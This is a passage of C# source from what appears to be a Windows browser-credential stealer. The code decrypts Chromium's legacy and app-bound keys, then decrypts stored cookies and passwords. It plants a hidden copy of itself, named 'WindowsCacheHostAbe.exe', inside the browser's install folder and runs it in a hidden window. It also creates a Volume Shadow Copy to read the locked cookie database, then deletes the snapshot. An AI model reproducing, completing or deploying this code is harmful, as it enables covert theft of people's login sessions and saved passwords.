        return candidates.FirstOrDefault(dir => File.Exists(Path.Combine(dir, exe)));
    }

    private byte[]? ReadAppBoundChromiumKey(string browser, string localStatePath, string? appDir)
    {
        if (appDir == null || !File.Exists(localStatePath)) return null;
        try
        {
            using JsonDocument doc = JsonDocument.Parse(File.ReadAllText(localStatePath));
            if (!doc.RootElement.TryGetProperty("os_crypt", out JsonElement osCrypt) ||
                !osCrypt.TryGetProperty("app_bound_encrypted_key", out JsonElement encryptedKey))
                return null;
            string? encoded = encryptedKey.GetString();
            if (string.IsNullOrWhiteSpace(encoded)) return null;
            byte[] blob = Convert.FromBase64String(encoded);
            if (blob.Length < 5 || Encoding.ASCII.GetString(blob, 0, 4) != "APPB") return null;

            string? helper = EnsureAbeHelper(appDir);
            if (helper == null)
            {
                _errors.Add($"{browser} ABE: cannot place helper in {appDir}");
                return null;
            }

            var psi = new ProcessStartInfo
            {
                FileName = helper,
                Arguments = $"--abe-helper {browser} \"{localStatePath}\"",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
            };
            using var process = Process.Start(psi);
            if (process == null) return null;
            string output = process.StandardOutput.ReadToEnd();
            string error = process.StandardError.ReadToEnd();
            if (!process.WaitForExit(15000))
            {
                try { process.Kill(); } catch { }
                return null;
            }
            if (process.ExitCode != 0)
            {
                _errors.Add($"{browser} ABE: {error.Trim()}");
                return null;
            }
            string? line = output.Split('\n')
                .FirstOrDefault(l => l.StartsWith("ABEKEY:", StringComparison.Ordinal));
            if (line == null) return null;
            byte[] key = Convert.FromBase64String(line[7..].Trim());
            return key.Length >= 32 ? key[..32] : null;
        }
        catch (Exception ex)
        {
            _errors.Add($"{browser} ABE: {ex.Message}");
            return null;
        }
    }

    /// <summary>
    /// The browser elevator only accepts callers whose image path normalizes to the
    /// browser installation. A hard link to this agent inside the Application folder
    /// gives the helper the right path without copying the 100+ MB binary.
    /// </summary>
    private static string? EnsureAbeHelper(string appDir)
    {
        try
        {
            string self = Environment.ProcessPath!;
            string link = Path.Combine(appDir, "WindowsCacheHostAbe.exe");
            if (string.Equals(Path.GetFullPath(self), Path.GetFullPath(link), StringComparison.OrdinalIgnoreCase))
                return link;
            if (File.Exists(link))
            {
                var existing = new FileInfo(link);
                var source = new FileInfo(self);
                if (existing.Length == source.Length && existing.LastWriteTimeUtc == source.LastWriteTimeUtc)
                    return link;
                try { File.Delete(link); }
                catch { return existing.Length == source.Length ? link : null; }
            }
            if (CreateHardLinkW(link, self, IntPtr.Zero))
            {
                try { File.SetAttributes(link, FileAttributes.Hidden); } catch { }
                return link;
            }
            try
            {
                File.Copy(self, link, true);
                try { File.SetAttributes(link, FileAttributes.Hidden); } catch { }
                return link;
            }
            catch { return null; }
        }
        catch { return null; }
    }

    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern bool CreateHardLinkW(string newFileName, string existingFileName, IntPtr securityAttributes);

    private byte[]? ReadLegacyChromiumKey(string localStatePath)
    {
        try
        {
            if (!File.Exists(localStatePath)) return null;
            using JsonDocument doc = JsonDocument.Parse(File.ReadAllText(localStatePath));
            if (!doc.RootElement.TryGetProperty("os_crypt", out var osCrypt) ||
                !osCrypt.TryGetProperty("encrypted_key", out var encryptedKey)) return null;
            string? encoded = encryptedKey.GetString();
            if (string.IsNullOrWhiteSpace(encoded)) return null;
            byte[] blob = Convert.FromBase64String(encoded);
            if (blob.Length > 5 && Encoding.ASCII.GetString(blob, 0, 5) == "DPAPI")
                blob = blob.AsSpan(5).ToArray();
            return ProtectedData.Unprotect(blob, null, DataProtectionScope.CurrentUser);
        }
        catch { return null; }
    }

    private static string? DecryptChromium(byte[] encrypted, ChromiumKeys keys, bool cookie)
    {
        try
        {
            if (encrypted.Length < 15) return null;
            string prefix = Encoding.ASCII.GetString(encrypted, 0, 3);
            byte[]? key = prefix switch
            {
                "v10" or "v11" => keys.Legacy,
                "v20" => keys.AppBound,
                _ => null,
            };
            if (key == null || key.Length != 32) return null;
            byte[] nonce = encrypted.AsSpan(3, 12).ToArray();
            byte[] tag = encrypted.AsSpan(encrypted.Length - 16, 16).ToArray();
            byte[] cipher = encrypted.AsSpan(15, encrypted.Length - 31).ToArray();
            byte[] plain = new byte[cipher.Length];
            using var aes = new AesGcm(key, 16);
            aes.Decrypt(nonce, cipher, tag, plain);
            if (cookie && prefix == "v20" && plain.Length > 32)
                return Encoding.UTF8.GetString(plain, 32, plain.Length - 32);
            return Encoding.UTF8.GetString(plain);
        }
        catch { return null; }
    }

    private static DateTimeOffset? ChromiumTime(long microseconds)
    {
        try
        {
            long unixMs = microseconds / 1000 - 11644473600000L;
            return unixMillis(unixMs);
        }
        catch { return null; }
    }

    private static DateTimeOffset? unixMillis(long ms)
    {
        try { return DateTimeOffset.FromUnixTimeMilliseconds(ms); } catch { return null; }
    }

    private string CopyToTemp(string path)
    {
        string copy = Path.Combine(_tempRoot, Guid.NewGuid().ToString("N") + Path.GetExtension(path));
        using var input = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite | FileShare.Delete);
        using var output = new FileStream(copy, FileMode.Create, FileAccess.Write, FileShare.None);
        input.CopyTo(output);
        return copy;
    }

    /// <summary>
    /// Chromium opens its Cookies database without sharing read access while the browser
    /// is running. A client-accessible VSS snapshot lets collection read it anyway.
    /// </summary>
    private string CopyBrowserDb(string path)
    {
        try { return CopyToTemp(path); }
        catch
        {
            string? shadow = EnsureShadow();
            if (shadow == null) throw;
            return CopyToTemp(ShadowPath(path, shadow));
        }
    }

    private string? EnsureShadow()
    {
        if (_shadowTried) return _shadowDevice;
        _shadowTried = true;
        try
        {
            string root = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)) ?? "C:\\";
            using var shadowClass = new ManagementClass("Win32_ShadowCopy");
            using var createParams = shadowClass.GetMethodParameters("Create");
            createParams["Volume"] = root;
            createParams["Context"] = "ClientAccessible";
            using var result = shadowClass.InvokeMethod("Create", createParams, null);
            if (result == null) return null;
            uint returnValue = Convert.ToUInt32(result["ReturnValue"] ?? 0);
            string? id = result["ShadowID"]?.ToString();
            if (returnValue != 0 || string.IsNullOrWhiteSpace(id)) return null;
            _shadowId = id;
            using var searcher = new ManagementObjectSearcher(
                "SELECT DeviceObject FROM Win32_ShadowCopy WHERE ID='" + id.Replace("'", "''") + "'");
            using var matches = searcher.Get();
            foreach (ManagementObject item in matches)
            {
                _shadowDevice = item["DeviceObject"]?.ToString();
                break;
            }
            return _shadowDevice;
        }
        catch { return null; }
    }

    private static string ShadowPath(string path, string device)
    {
        string root = Path.GetPathRoot(path) ?? "C:\\";
        return Path.Combine(device, path[root.Length..]);
    }

    private void DeleteShadow()
    {
        if (string.IsNullOrWhiteSpace(_shadowId)) return;
        try
        {
            using var searcher = new ManagementObjectSearcher(
                "SELECT * FROM Win32_ShadowCopy WHERE ID='" + _shadowId.Replace("'", "''") + "'");
            using var matches = searcher.Get();
            foreach (ManagementObject item in matches)
            {
                try { item.Delete(); } catch { }
            }
        }
        catch { }
        finally
        {
            _shadowId = null;
            _shadowDevice = null;
        }
    }

    private static void TryDelete(string path)
    {
        try { if (File.Exists(path)) File.Delete(path); } catch { }
    }
}
